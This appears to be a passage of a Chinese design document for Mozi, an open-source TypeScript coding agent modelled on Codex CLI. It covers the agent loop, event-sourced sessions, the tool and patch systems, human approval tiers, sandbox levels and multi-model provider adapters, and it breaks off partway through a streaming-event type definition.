---
AIGC:
  ContentProducer: '001191110102MAD55U9H0F10002'
  ContentPropagator: '001191110102MAD55U9H0F10002'
  Label: '1'
  ProduceID: 'f2fa8afd-9f40-4323-af0f-01e8e2359943'
  PropagateID: 'f2fa8afd-9f40-4323-af0f-01e8e2359943'
  ReservedCode1: '05fb71a2-3d0d-4d82-94ce-7c4b671d69f0'
  ReservedCode2: '05fb71a2-3d0d-4d82-94ce-7c4b671d69f0'
---

# 墨子（Mozi）—— 仿 Codex 的编码 Agent 开发技术方案

> 项目定名：**墨子（Mozi）**——取自墨家：机关术（工具工程）· 名辩逻辑（推理循环）· 守城之术（沙箱安全）
> 命名规范：中文叙述可用「墨子」，命令/包名/代码统一小写 `mozi`（如 `mozi serve`、`@mozi/core`）
> 文档类型：技术设计文档（Design Doc）
> 状态：v1.5 草案（v1.1 子智能体；v1.2 完整 MCP；v1.3 定时任务；v1.4 移动端；v1.5 提示词工程/记忆/多模态/Hooks）
> 产品形态：CLI（TUI）+ 桌面应用（Electron）+ 移动端（React Native，远程连接本地引擎）
> 技术栈：TypeScript / Node.js，Monorepo（pnpm + Turborepo）
> 定位：开源项目

---

## 目录

- [0. TL;DR](#0-tldr)
- [1. 背景与目标](#1-背景与目标)
  - [1.1 问题陈述](#11-问题陈述)
  - [1.2 目标（Goals）](#12-目标goals)
  - [1.3 非目标（Non-Goals）](#13-非目标non-goals)
- [2. 对标产品拆解](#2-对标产品拆解)
  - [2.1 Codex CLI 能力矩阵](#21-codex-cli-能力矩阵)
  - [2.2 竞品横向对比](#22-竞品横向对比)
  - [2.3 差异化定位](#23-差异化定位)
- [3. 总体架构](#3-总体架构)
  - [3.1 设计原则](#31-设计原则)
  - [3.2 分层架构](#32-分层架构)
  - [3.3 运行时模型与进程拓扑](#33-运行时模型与进程拓扑)
  - [3.4 核心设计：事件溯源 + 开放协议](#34-核心设计事件溯源--开放协议)
- [4. 核心模块详细设计](#4-核心模块详细设计)
  - [4.1 Agent Loop 引擎](#41-agent-loop-引擎)
  - [4.2 事件系统与数据模型](#42-事件系统与数据模型)
  - [4.3 工具系统](#43-工具系统)
  - [4.4 LLM Provider 层](#44-llm-provider-层)
  - [4.5 上下文管理](#45-上下文管理)
  - [4.6 安全模型与沙箱](#46-安全模型与沙箱)
  - [4.7 会话与持久化](#47-会话与持久化)
  - [4.8 MCP 集成](#48-mcp-集成)
- [5. 交互层设计](#5-交互层设计)
  - [5.1 CLI / TUI](#51-cli--tui)
  - [5.2 桌面应用](#52-桌面应用)
- [6. 工程结构与技术选型](#6-工程结构与技术选型)
  - [6.1 Monorepo 目录结构](#61-monorepo-目录结构)
  - [6.2 技术选型清单](#62-技术选型清单)
  - [6.3 关键决策记录（ADR 摘要）](#63-关键决策记录adr-摘要)
- [7. 实施路线图](#7-实施路线图)
- [8. 测试与质量保障](#8-测试与质量保障)
- [9. 开源工程建设](#9-开源工程建设)
- [10. 风险评估与应对](#10-风险评估与应对)

---

## 0. TL;DR

墨子（Mozi）是一个用 TypeScript 实现的开源编码 Agent，对标 OpenAI Codex CLI 的核心能力（Agent Loop、工具调用、沙箱执行、审批机制、上下文压缩、会话管理），同时具备七项 Codex 不具备的差异化能力：

1. **引擎可复用**：核心引擎 `@mozi/core` 是独立 npm 包，任何 Node.js 应用可以嵌入 mozi 的完整 Agent 能力（Codex CLI 的 Rust core 无法被外部复用）；
2. **协议开放**：所有对外交互基于可序列化的事件流（JSON-RPC 风格），CLI、桌面应用、未来的 IDE 插件/Web 端共享同一套协议，天然支持多客户端；
3. **多模型一等公民**：从第一天起以 OpenAI 兼容协议为基线深度适配多家模型（OpenAI / Anthropic / DeepSeek / Qwen / Ollama 本地模型），含能力协商与降级策略，而非单一模型的附属品；
4. **子智能体编排**：主 Agent 可派发隔离上下文的子 Agent（explore 只读调研 / general 通用委派 / reviewer 代码审查 / 自定义模板），支持并行执行、权限单调收紧、审批冒泡与级联取消（v1.1 新增，详细设计见详细设计文档 M12）。

总体架构为**四层分层 + 事件驱动**：`Interface（TUI / Desktop）→ Protocol（事件流）→ Engine（Loop / Context / Policy / Session）→ Foundation（Tools / Providers / Sandbox / MCP）`。CLI 与桌面应用只是同一引擎的两个壳，共享全部业务逻辑。

实施分六个里程碑：M0 工程基建 → M1 引擎闭环（最小可用）→ M2 安全与编辑能力 → M3 沙箱与生态 → M4 桌面应用 → M5 开源运营与评测体系。每个里程碑有明确的验收标准（DoD）。

---

## 1. 背景与目标

### 1.1 问题陈述

2025-2026 年，编码 Agent 已成为 LLM 落地最成功的场景。OpenAI Codex CLI、Anthropic Claude Code、Google Gemini CLI 验证了「LLM + 工具调用 + 沙箱执行」范式可以完成真实的工程任务（修 bug、重构、写测试、跨文件改动），而不仅仅是补全代码。

但现有产品存在以下问题，构成了 mozi 的立项理由：

| 问题 | 现状 | mozi 的回答 |
|------|------|------------|
| **引擎不可复用** | Codex CLI 的 Rust core 与 CLI 耦合；Claude Code 闭源；Gemini CLI 的 core 面向自家场景 | 引擎独立成包，二次开发友好 |
| **模型绑定** | Codex 绑 OpenAI 模型能力（Responses API / reasoning），Claude Code 绑 Anthropic | 多模型深度适配 + 能力协商 |
| **桌面体验缺失** | Codex/Claude Code 均以终端为主，diff 审阅、多会话管理体验有限 | 桌面应用为一级产品形态 |
| **自建门槛高** | 开发者想自建 Agent 需从零实现 loop、工具、安全、压缩等轮子 | `@mozi/core` 直接复用 |

### 1.2 目标（Goals）

**产品目标**

- G1：实现完整的 Agent Loop——从自然语言任务到「规划 → 工具调用 → 验证 → 迭代」的自主执行闭环；
- G2：覆盖 Codex CLI 核心能力矩阵：文件读写/编辑、shell 执行、代码搜索（grep/glob）、apply_patch 结构化编辑、审批分级、上下文压缩、会话持久化与恢复、AGENTS.md 项目指令、MCP 工具扩展、**子智能体编排（task 工具 + 模板 + 并发/深度/权限控制）**；
- G3：三端形态共享同一引擎与数据：CLI（TUI）、桌面应用（Electron）、移动端（React Native，经 @mozi/protocol 远程接入，v1.4）；
- G4：多模型接入：OpenAI / Anthropic / DeepSeek / Qwen / GLM / Ollama（本地），运行时可切换，含 planner/executor 模型分工；
- G5：安全性对标 Codex：分级审批 + 命令风险分析 + 沙箱执行（多平台）+ 工作区边界管控；
- G6：开源工程质量：完善的测试体系（含真实模型评测集）、CI/CD、版本发布、文档站。

**技术目标**

- T1：`@mozi/core` 零 UI 依赖，可在 Node.js ≥ 20 环境独立运行；
- T2：所有跨层交互基于可序列化 DTO（事件流），进程内直连与跨进程（IPC/WebSocket）两种传输模式零代码差异；
- T3：核心链路（loop、patch 解析、policy 规则）测试覆盖率 ≥ 90%；
- T4：冷启动到可交互 < 1s（CLI），会话 resume < 500ms；
- T5：跨平台：macOS / Linux / Windows 一等公民支持。

### 1.3 非目标（Non-Goals）

- **NG1**：不做云端托管服务（无多租户、无计费）——聚焦本地优先（local-first）；
- **NG2**：不做 IDE 插件（VS Code/JetBrains）——协议层预留能力，但不在路线图内；
- **NG3**：不自研模型与推理框架；
- **NG4**：不做代码补全（Copilot 类功能）——只做任务级 Agent；
- **NG5**：MVP 阶段不支持语音/实时协作等扩展模态；
- **NG6**：不追求与 Codex 的 Rust 实现性能对齐——以开发效率与生态为先。

---

## 2. 对标产品拆解

### 2.1 Codex CLI 能力矩阵

Codex CLI（开源部分，Rust 实现）的核心能力，即 mozi 的功能基线：

| 能力域 | Codex 实现 | mozi 对应模块 |
|--------|-----------|--------------|
| Agent Loop | 模型流式输出 → tool call → 结果回填 → 续跑 | `@mozi/core` AgentEngine |
| 工具集 | exec(shell)、read_file、apply_patch、update_plan | `@mozi/tools` |
| 结构化编辑 | apply_patch（类 diff 格式，context 行精确匹配） | PatchEngine（同思路重实现） |
| 审批模式 | suggest / auto-edit / full-auto 三档 | PolicyEngine（规则可配置，粒度更细） |
| 沙箱 | macOS Seatbelt、Linux Landlock+seccomp、容器 | `@mozi/sandbox` 四级沙箱 |
| 上下文管理 | 历史 compact、AGENTS.md 注入 | ContextManager（分层预算 + 自动压缩） |
| 会话 | rollout 文件（JSONL 事件日志）、resume、fork | SessionStore（事件溯源） |
| 扩展 | MCP client（stdio）、自定义 prompt | `@mozi/mcp-client`、slash 命令 |
| 非交互 | `codex exec` 供 CI 调用 | `mozi exec --json` |
| 多模态 | 图片输入（截图理解） | 视觉管线 + screenshot 工具 + 任务截图验证（M17） |
| 子智能体 | cloud 版有并行任务，CLI 版无 | SubAgentSupervisor（同进程嵌套，见详细设计 M12） |
| 定时任务 | 无内置调度器 | TaskScheduler（tick 架构 + 无人值守安全模型，见详细设计 M13） |
| 移动端 | 无 | Expo/RN 客户端 + WSS 协议 + E2E 中继（见详细设计 M14） |
| 跨会话记忆 | 无（仅 AGENTS.md） | 三层记忆（用户/项目/语义检索，M16） |
| Hooks | 无 | 生命周期插件 + 项目级防投毒（M18） |

**MCP 深度（v1.2）**：完整对齐 MCP 2025-06-18 规范——双传输（stdio + Streamable HTTP 含 OAuth 2.1，旧 HTTP+SSE 降级兼容）；五大能力：Tools（动态注册/热更新/进度/取消）、Resources（读取 + 订阅注入上下文）、Prompts（映射为 /mcp: 斜杠命令）、Sampling（server 借用 LLM，默认 deny + 白名单 + 审批冒泡 + 预算上限）、Elicitation（server 向用户提问，表单冒泡 + 频控）；另支持 Roots、参数补全、日志。安全红线：server 内容永不进 system prompt；子智能体中 sampling 强制 deny（详见详细设计 M8）。

### 2.2 竞品横向对比

| 维度 | Codex CLI | Claude Code | Gemini CLI | Aider | **mozi** |
|------|-----------|-------------|------------|-------|----------|
| 开源协议 | Apache-2.0 | 闭源 | Apache-2.0 | Apache-2.0 | **Apache-2.0** |
| 语言 | Rust | TS（闭源） | TS | Python | **TS** |
| 引擎可复用 | ✗ | ✗ | 部分（core 面向自家） | ✗ | **✓ 独立 npm 包** |
| 多模型 | OpenAI 系 | Anthropic 系 | Gemini 系 | 多模型 | **多模型 + 能力协商** |
| 桌面端 | ✗ | ✗（仅 VS Code 插件） | ✗ | ✗ | **✓ Electron** |
| 沙箱 | OS 级 + 容器 | 容器为主 | 容器/无 | 无 | **四级沙箱** |
| 交互协议 | 私有 | 私有 | 私有 | 无 | **开放事件协议** |
| MCP | ✓ | ✓ | ✓ | ✗ | **✓ 完整客户端（双传输+Tools/Resources/Prompts/Sampling/Elicitation）** |
| 子智能体 | ✗（CLI 版） | ✓（Task tool） | ✗ | ✗ | **✓ 同进程嵌套 + 事件可视** |
| 定时任务 | ✗ | ✗（仅 hooks） | ✗ | ✗ | **✓ 内置调度 + 产物隔离 + 通知** |
| 移动端远程接入 | ✗ | ✗ | ✗ | ✗ | **✓ 手机下发任务/实时细节/审批推送** |
| 跨会话记忆 | ✗ | 部分（auto-memory） | ✗ | ✗ | **✓ 三层记忆 + 信任分级** |
| Hooks 插件 | ✗ | ✓ | ✗ | ✗ | **✓ 含项目级防投毒** |

### 2.3 差异化定位

> 一句话：**墨子 = Codex 的能力 + Claude Code 的子智能体 + Gemini CLI 的技术栈 + 内置调度自动化 + 移动端远程接入 + 任何人都能嵌入的引擎 + 桌面级体验。**

六个差异化卖点按优先级：

1. **引擎即产品（Engine-as-a-Product）**：`@mozi/core` 面向两类用户——终端用户（直接用 CLI/桌面）与开发者（嵌入自己的应用）。这决定了 API 设计必须稳定、文档化、无副作用。
2. **开放协议**：所有事件与请求 DTO 定义在 `@mozi/shared`，桌面端、CLI、未来任何客户端共享。这是「一次实现，多端受益」的架构基石。
3. **多模型深度适配**：不只是「能填 baseURL」，而是针对各家 tool-calling 的差异（参数格式、流式分片、并行调用支持、reasoning 内容剥离）做适配矩阵与集成测试，并支持 planner/executor 双模型分工（便宜模型做规划，强模型做执行）。
4. **子智能体编排（v1.1）**：子 Agent 复用同一引擎（无第二套实现），核心价值是上下文隔离（12 步调研只回传 300 token 摘要而非 30k 过程）与并行加速；权限单调收紧 + 审批冒泡保证安全性不降级；子会话独立事件日志可在 UI 完整回放（比 Claude Code 的黑盒子子任务更透明）。
5. **定时任务（v1.3）**：tick 架构（OS 每分钟唤醒 + mozi 内部 cron 求解，增删任务零 OS 依赖）；无人值守安全模型把「等人审批」静态化为确定性策略（白名单/deny 自纠）；git worktree 产物隔离让自动化改动天然可审（分支/PR 而非直改工作区）；竞品均无内置调度。
6. **移动端远程接入（v1.4）**：手机是一等客户端而非阉割版——审批推送是杀手级场景（高危命令带风险分解、分级限制手机可批范围）；本地优先（连的是你自己机器上的 Agent，数据不经第三方托管）；E2E 自托管中继使跨网访问不牺牲隐私；推送载荷零内容。

---

## 3. 总体架构

### 3.1 设计原则

1. **Core 与 Shell 严格分离**：引擎层不 import 任何 UI 相关依赖，不感知运行环境（终端/桌面/CI）。UI 只是事件的订阅者与请求的发起者。
2. **事件溯源（Event Sourcing）**：会话状态 = 事件流的折叠（fold）。持久化的是事件而非快照，resume/fork/回放/调试全部免费获得。
3. **一切跨边界数据皆可序列化**：事件、请求、工具结果全部是 plain object（DTO），杜绝 class 实例跨进程传递。进程内调用与 IPC/WebSocket 传输行为一致。
4. **安全默认从严**：默认审批模式为 `auto`（写文件自动、shell 需确认），`full-auto` 强制要求沙箱等级 ≥ L2。
5. **平台差异下沉**：Windows/macOS/Linux 差异封装在 `sandbox` 与 `tools/shell` 内部，上层协议统一。
6. **渐进式复杂度**：M1 不引入沙箱与 MCP 也能完整闭环，模块按里程碑解锁，避免过度设计前置。

### 3.2 分层架构

```
┌─────────────────────────────────────────────────────────────────┐
│  Interface Layer  交互层（薄壳，无业务逻辑）                        │
│  ┌──────────────┐ ┌──────────────┐ ┌──────────────┐ ┌───────────┐ │
│  │ @mozi/cli    │ │ @mozi/desktop │ │ @mozi/mobile │ │ mozi exec │ │
│  │ Ink + React  │ │ Electron     │ │ Expo/RN      │ │ (非交互/CI)│ │
│  └──────┬───────┘ └──────┬───────┘ └──────┬───────┘ └─────┬─────┘ │
│         │    事件订阅 / 请求下发（IPC / 进程内 / WSS）      │       │
├───────────┴────────────────┴──────────────────────────┴──────────┤
│  Transport Layer  传输层（@mozi/protocol 统一通道语义，v1.4）     │
│  进程内直连 │ Electron IPC │ WSS（远程/移动端：LAN 直连或 E2E 中继）│
├──────────────────────────────────────────────────────────────────┤
│  Engine Layer  引擎层（@mozi/core，纯逻辑，UI 无关）                │
│  ┌────────────┐ ┌──────────────┐ ┌────────────┐ ┌────────────┐   │
│  │ AgentEngine│ │ ContextManager│ │ Policy     │ │ Session    │   │
│  │ (Loop 状态机)│ │ (预算/压缩/注入)│ │ Engine(审批)│ │ Store(溯源)│   │
│  └────────────┘ └──────────────┘ └────────────┘ └────────────┘   │
│  ┌──────────────────────────┐                                  │
│  │ SubAgentSupervisor (v1.1) │  子智能体编排：模板/并发槽/深度控制 │
│  └──────────────────────────┘                                  │
├──────────────────────────────────────────────────────────────────┤
│  Foundation Layer  基础能力层                                     │
│  ┌────────────┐ ┌──────────────┐ ┌────────────┐ ┌────────────┐   │
│  │ @mozi/tools│ │ @mozi/       │ │ @mozi/     │ │ @mozi/     │   │
│  │ 内置工具集  │ │  providers   │ │  sandbox   │ │  mcp-client│   │
│  │ +Patch引擎 │ │ 多模型适配    │ │ 四级沙箱    │ │ MCP 客户端 │   │
│  └────────────┘ └──────────────┘ └────────────┘ └────────────┘   │
├──────────────────────────────────────────────────────────────────┤
│  @mozi/shared  共享 DTO 层（事件/请求/错误码，零依赖，双向引用根）     │
└──────────────────────────────────────────────────────────────────┘
```

**依赖方向铁律**：`shared` 零依赖；`foundation` 只依赖 `shared`；`engine` 依赖 `foundation + shared`；`interface` 只依赖 `engine 对外 API + shared`。任何反向依赖在 CI 的 dependency-cruiser 检查中直接失败。

### 3.3 运行时模型与进程拓扑

三种运行模式，同一份引擎代码：

```
模式 A：CLI 进程内（默认，零开销）
┌──────────────────────────────┐
│ mozi-cli 进程 (Node.js)       │
│  Ink(TUI) ──直连── AgentEngine│
└──────────────────────────────┘

模式 B：桌面应用（IPC 桥）
┌─────────────────────────────────────┐
│ Electron 应用                        │
│ ┌─────────────┐  IPC   ┌──────────┐ │
│ │ Renderer    │◄──────►│ Main     │ │
│ │ React UI    │ events │ AgentSvc │ │
│ │ (zustand)   │ req    │ (Engine) │ │
│ └─────────────┘        └──────────┘ │
└─────────────────────────────────────┘

模式 C：远程/移动端（v1.4 已完全实现，见详细设计 M14）
┌──────────┐  WSS(E2E)  ┌─────────────┐  WSS  ┌──────────────┐
│ 移动端    │◄──────────►│ mozi-relay  │◄─────►│ mozi 节点      │
│ (Expo/RN)│  或 LAN 直连 │ (自托管，零内容) │      │ (serve/桌面远程) │
└──────────┘             └─────────────┘      └──────────────┘
```

- 模式 A 中 TUI 与引擎通过 `AsyncIterable`（事件）+ 方法调用（请求）直连；
- 模式 B 中 Electron Main 进程持有引擎实例，通过 `ipcMain/ipcRenderer` 转发同一套 DTO；
- 模式 C 将传输层换成 WebSocket，引擎与 UI 代码零改动——这是 3.1 原则 3（可序列化）的直接收益。

### 3.4 核心设计：事件溯源 + 开放协议

**事件流是 mozi 的中枢神经系统。** 引擎所有状态变化都表现为事件：

```
用户输入 ──► [turn.started]
        ──► [message.delta × N]           ← 模型流式输出
        ──► [tool.requested]              ← 模型发起工具调用
        ──► [tool.approval.required]      ← 策略引擎要求人工确认
        ──► [tool.approval.resolved]      ← 用户批准/拒绝
        ──► [tool.started / tool.completed]
        ──► [subagent.started]            ← v1.1：task 工具派发子智能体
        ──► [subagent.progress × N]       ← 低频桥接（子事件全量在子日志）
        ──► [subagent.approval.required]  ← 子审批冒泡（如有）
        ──► [subagent.completed + 摘要]   ← 摘要回传主上下文
        ──► [turn.completed + usage]      ← 一轮结束
        ──► ... 循环直至 [task.completed]
```

由此获得的免费能力：

| 能力 | 实现方式 |
|------|---------|
| 会话持久化 | 事件追加写入 JSONL 文件 |
| 会话恢复（resume） | 重放事件流折叠出状态 |
| 会话分叉（fork） | 截断事件流到第 N 个事件，从该点续跑 |
| 桌面端实时同步 | 事件经 IPC/WebSocket 转发到任意订阅者 |
| 调试与回放 | 离线重放事件流复现任意会话 |
| 遥测与评测 | 从事件流提取 token 用量、工具成功率、审批耗时 |

---

## 4. 核心模块详细设计

### 4.1 Agent Loop 引擎

#### 4.1.1 状态机

```
                  ┌─────────┐
     user input   │  IDLE   │
   ──────────────►│ (等待)   │
                  └────┬────┘
                       │ turn.start()
                       ▼
                  ┌──────────┐   tool_calls 非空
                  │ THINKING │◄──────────────────┐
                  │ (模型流式) │                   │
                  └────┬─────┘                   │
        ┌─────────────┼─────────────┐            │
        │无工具调用     │有工具调用     │            │
        ▼             ▼             │            │
  ┌──────────┐  ┌───────────┐      │            │
  │ COMPLETED│  │ PENDING   │ 需审批 │            │
  │ (任务完成) │  │ _APPROVAL │──────┤            │
  └──────────┘  └─────┬─────┘ 用户批准│            │
                      │    /策略放行 │            │
                      ▼             │            │
                 ┌───────────┐      │            │
                 │ EXECUTING │──────┴────────────┘
                 │ (工具执行) │  结果作为 tool message
                 └───────────┘  回填进入下一轮 THINKING

  任意状态 ──用户 Esc──► INTERRUPTED（携带取消原因回填模型）
  任意状态 ──异常──► ERROR（可恢复：错误信息回填，模型自适应重试）
```

#### 4.1.2 引擎主循环（核心代码骨架）

```ts
// packages/core/src/engine/agent-engine.ts
export class AgentEngine {
  constructor(
    private providers: ProviderRegistry,
    private tools: ToolRegistry,
    private policy: PolicyEngine,
    private context: ContextManager,
    private sessions: SessionStore,
  ) {}

  /** 对外唯一入口：事件流既是 UI 的数据源，也是持久化日志 */
  async *run(input: RunInput): AsyncGenerator<AgentEvent> {
    const session = this.sessions.load(input.sessionId);
    session.push({ role: 'user', content: input.text });

    for (let step = 0; step < session.limits.maxSteps; step++) {
      // 1. 组装上下文（预算裁剪 + 压缩 + AGENTS.md 注入）
      const ctx = this.context.build(session);

      // 2. 调用 LLM（流式），透传 token 增量事件
      const provider = this.providers.resolve(session.config.models.executor);
      const stream = provider.chat({
        messages: ctx.messages,
        tools: this.tools.schemas(ctx.enabledTools),
        signal: input.signal,
      });
      for await (const ev of stream) yield* this.forward(ev);

      const reply = stream.result(); // 聚合后的 assistant message
      session.push(reply);

      // 3. 无工具调用 → 本轮任务结束
      if (reply.toolCalls.length === 0) {
        yield { type: 'task.completed', reason: 'model_finished' };
        return;
      }

      // 4. 逐个处理工具调用（读类可并行，写类/执行类串行）
      for (const group of this.tools.groupBySafety(reply.toolCalls)) {
        const results = await Promise.all(
          group.map((call) => this.executeTool(session, call)),
        );
        for (const ev of results) yield* ev; // yield* 展开
      }
    }
    yield { type: 'task.completed', reason: 'max_steps_exceeded' };
  }

  private async *executeTool(s: Session, call: ToolCall) {
    yield { type: 'tool.requested', call };
    const decision = this.policy.evaluate(call, s.config.policy);
    if (decision.type === 'ask') {
      yield { type: 'tool.approval.required', call };
      const user = await this.pendingApprovals.wait(call.id); // UI 应答
      if (user === 'deny') {
        const result = deniedResult(call);
        s.pushToolResult(call.id, result);
        yield { type: 'tool.completed', callId: call.id, result };
        return;
      }
    }
    yield { type: 'tool.started', callId: call.id };
    const result = await this.tools.dispatch(call, { session: s, signal: ... });
    s.pushToolResult(call.id, result);
    yield { type: 'tool.completed', callId: call.id, result };
  }
}
```

#### 4.1.3 关键设计点

| 设计点 | 方案 | 理由 |
|--------|------|------|
| 步数上限 | 默认 50 步，可配置 | 防失控循环（模型反复跑测试修复不了等） |
| 工具失败处理 | 失败信息作为 tool message 回填，模型自适应重试；同一工具连续失败 3 次注入提示 | 让模型自己纠错是 Agent 的核心价值 |
| 中断处理 | `AbortSignal` 贯穿 LLM 流与工具执行；中断原因回填为 system message | 用户 Esc 后模型知道「用户要求停止」，可总结已完成部分 |
| 并发分组 | 读类工具（read/grep/glob）并行，写类/执行类串行 | 读无副作用可并行提速；写有顺序依赖 |
| 超时 | 每工具默认 120s 超时（shell 可自定义），LLM 流 300s 空闲超时 | 兜底挂起 |
| turn 与 step 区分 | turn = 用户一次输入触发的完整执行；step = turn 内一次模型推理 | 术语对齐 Codex |

### 4.2 事件系统与数据模型

#### 4.2.1 事件类型定义（@mozi/shared）

```ts
// packages/shared/src/events.ts
export type AgentEvent =
  // 会话生命周期
  | { type: 'session.started'; sessionId: string; config: SessionConfig }
  | { type: 'session.resumed'; sessionId: string; replayedEvents: number }
  // 轮次
  | { type: 'turn.started'; turnId: string; input: string }
  | { type: 'message.delta'; text: string }              // 流式文本
  | { type: 'message.completed'; message: AssistantMessage }
  // 工具调用
  | { type: 'tool.requested'; call: ToolCall }
  | { type: 'tool.approval.required'; call: ToolCall; reason: string }
  | { type: 'tool.approval.resolved'; callId: string; decision: 'allow' | 'deny' }
  | { type: 'tool.started'; callId: string }
  | { type: 'tool.completed'; callId: string; result: ToolResult }
  // 上下文
  | { type: 'context.compacted'; removedTurns: number; savedTokens: number }
  // 收尾
  | { type: 'turn.completed'; usage: TokenUsage; steps: number }
  | { type: 'task.completed'; reason: TaskCompleteReason }
  | { type: 'error'; error: AgentError; recoverable: boolean };
```

#### 4.2.2 核心数据结构

```ts
// 工具调用（模型 → 引擎）
export interface ToolCall {
  id: string;                  // call_id
  name: string;                // 'edit_file' 等
  arguments: unknown;          // 已通过 JSON Schema 校验
  riskLevel: 'read' | 'write' | 'exec' | 'meta';
}

// 工具结果（引擎 → 模型）
export interface ToolResult {
  callId: string;
  content: string;             // 给模型看的（已截断、已格式化）
  display?: DisplayPayload;    // 给用户看的（diff 卡片、markdown）
  isError: boolean;
  meta?: { durationMs?: number; truncated?: boolean };
}

// 消息（provider 无关的内部格式）
export type ChatMessage =
  | { role: 'system'; content: string }
  | { role: 'user'; content: UserContent[] }   // text / image / file ref
  | { role: 'assistant'; content: string | null; toolCalls?: ToolCall[]; reasoning?: string }
  | { role: 'tool'; callId: string; content: string; isError?: boolean };

// 会话配置
export interface SessionConfig {
  models: { planner?: string; executor: string };  // 双模型分工
  policy: PolicyConfig;       // 审批策略（见 4.6）
  sandbox: { level: 0 | 1 | 2 | 3 };
  context: { maxTokens?: number; autoCompactThreshold?: number };
  enabledTools: string[];     // '*' 或白名单
}
```

**要点**：`ChatMessage` 是 mozi 内部统一格式，各 Provider 负责与自家 API 格式互转。Anthropic 的 tool_use/tool_result block、OpenAI 的 tool_calls/tool role、DeepSeek 的格式差异全部消化在 Provider 层，引擎层完全无感。

### 4.3 工具系统

#### 4.3.1 工具协议

```ts
// packages/tools/src/types.ts
export interface AgentTool<TInput = unknown> {
  name: string;
  description: string;          // 面向模型的自然语言说明（精雕细琢，这是效果关键）
  parameters: JSONSchema;       // Function Calling 参数 schema
  riskLevel: 'read' | 'write' | 'exec' | 'meta';

  execute(input: TInput, ctx: ToolContext): Promise<ToolResult>;
}

export interface ToolContext {
  workspace: Workspace;         // 根路径 + 边界（见 4.6.4）
  signal: AbortSignal;
  session: SessionView;         // 只读视图（cwd、历史摘要）
  sandbox: SandboxRunner;       // 命令执行走沙箱通道
}
```

#### 4.3.2 内置工具集

| 工具 | risk | 说明 |
|------|------|------|
| `read_file` | read | 读取文件，支持行区间；>2000 行分页；输出带行号前缀 |
| `write_file` | write | 新建/整体覆写（小文件） |
| `edit_file` | write | **apply_patch 结构化编辑**（见下） |
| `glob` | read | 按模式查找文件路径 |
| `grep` | read | 内容正则搜索（ripgrep 优先，降级 JS 实现），返回 文件:行号:内容 |
| `shell` | exec | 沙箱内执行命令，捕获 stdout/stderr/exit code |
| `todo_list` | meta | 计划工具：维护任务清单（对标 Codex update_plan），让长任务不迷路 |
| `list_dir` | read | 目录树概览（带 ignore 规则） |

**输出截断策略**（上下文保护的第一道防线）：

- `shell`：stdout/stderr 各保留头 200 行 + 尾 50 行，中间以 `... [truncated N lines]` 标注，并在 `meta.truncated` 标记，模型可决定分页重跑；
- `read_file`：单次最多 500 行，超出提示用 offset 分页；
- `grep`：默认最多 50 个匹配，提示可用更窄 pattern。

#### 4.3.3 apply_patch 结构化编辑（PatchEngine）

全文重写大文件既浪费 token 又易出错。仿 Codex 实现基于上下文行匹配的 patch 协议：

```
*** Begin Patch
*** Update File: src/utils/date.ts
@@ export function formatDate(d: Date) {
-  return d.toLocaleDateString();
+  return d.toISOString().slice(0, 10);
 }
*** Add File: src/utils/now.ts
+export const now = () => Date.now();
*** Delete File: src/utils/legacy-date.ts
*** End Patch
```

**执行算法**：

1. 解析 patch → 每个文件得到 hunks（context/删除/新增行序列）；
2. 对每个 hunk 在目标文件中定位锚点：从上一次匹配位置向后扫描，找 context 行 + 删除行的精确匹配（容忍行尾空白差异）；
3. 匹配失败 → 整个 patch 拒绝，返回**结构化错误**（哪个文件哪个 hunk 期望什么实际什么），回填给模型重新生成；
4. 匹配成功 → 原子应用（先全部校验后写入，中途失败不落盘）；写入前保存原文件快照到会话临时区（支持 `/undo`）。

**工具描述词要点**（写给模型的 prompt 在 `description` 中精雕）：

- 要求模型先 `read_file` 再 patch（禁止盲改）；
- context 行给 2-3 行稳定锚点，不要用空行做唯一锚点；
- 大改（>40% 行）建议直接 `write_file`。

PatchEngine 是纯函数模块，**单测性价比最高的部分**：用 fuzz（随机删改行后生成 patch）验证匹配鲁棒性。

#### 4.3.4 工具注册与扩展

```ts
registry.register(builtin.read, builtin.write, builtin.edit /* ... */);
registry.register(mcpBridge.adapt(mcpServer.tools));   // MCP 工具动态接入
```

- 内置工具与 MCP 工具同一接口，策略引擎统一管控；
- 工具描述集中维护在 `tools/descriptions/*.md`（版本化管理，微调效果可 diff 可回滚）。

### 4.4 LLM Provider 层

#### 4.4.1 架构

```
        AgentEngine（只认统一接口）
             │
      ProviderRegistry ── resolve(modelId)
             │
   ┌─────────┼──────────┬─────────────┐
   ▼         ▼          ▼             ▼
OpenAI    Anthropic   Ollama      任意 OpenAI 兼容端点
Provider  Provider    Provider    （DeepSeek/Qwen/GLM/OneAPI/vLLM...）
（官方SDK） （官方SDK）  （HTTP）      （openai-sdk + 自定义 baseURL）
```

**设计**：Anthropic 单独适配（tool_use 协议不同、system 独立字段）；其余一切走 OpenAI 兼容协议（`openai` 官方 SDK + `baseURL` 覆盖，覆盖市面上 90% 模型服务，含本地 Ollama/vLLM）。

```ts
export interface LLMProvider {
  id: string;
  capabilities(): ProviderCapabilities;
  chat(req: ChatRequest, signal?: AbortSignal): AsyncIterable<StreamEvent> & {
    result(): AssistantMessage;
  };
}

export interface ProviderCapabilities {
  parallelToolCalls: boolean;   // 不支持则引擎串行发起
  vision: boolean;              // 图片输入
  reasoning: boolean;           // reasoning content 需剥离（如 R1/o系列）
  maxContextTokens: number;
  streamingToolArgs: boolean;   // 流式中工具参数增量聚合能力
}
```

#### 4.4.2 配置体系（分层合并）

```
优先级：CLI 参数 > 项目 .mozi/config.json > 全局 ~/.mozi/config.json > 内置默认

// ~/.mozi/config.json 示例
{
  "models": {
    "executor": "deepseek-chat",
    "planner": "deepseek-reasoner"
  },
  "providers": {
    "deepseek": {
      "baseUrl": "https://api.deepseek.com/v1",
      "apiKeyEnv": "DEEPSEEK_API_KEY"       // 只存环境变量名，不落盘密钥
    },
    "openai":  { "baseUrl": "https://api.openai.com/v1", "apiKeyEnv": "OPENAI_API_KEY" },
    "anthropic": { "apiKeyEnv": "ANTHROPIC_API_KEY" },
    "ollama":  { "baseUrl": "http://127.0.0.1:11434/v1" }
  },
  "defaultPolicy": "auto",
  "sandbox": { "level": "auto" }            // auto: 平台最优
}
```

#### 4.4.3 流式解析统一化

各家流式 tool-call 分片差异极大（OpenAI 按 index 增量拼 JSON；Anthropic 整块 input_json_delta；部分兼容端点一次性给全量参数），统一由各 Provider 聚合为：

```ts
type StreamEvent =
  | { type: 'text.delta'; text: string }
  | { type: 'reasoning.delta'; text: string }   // 剥离思维链，不进正式上下文
  | { type: 'toolcall.args.delta'; index: number; fragment: string }
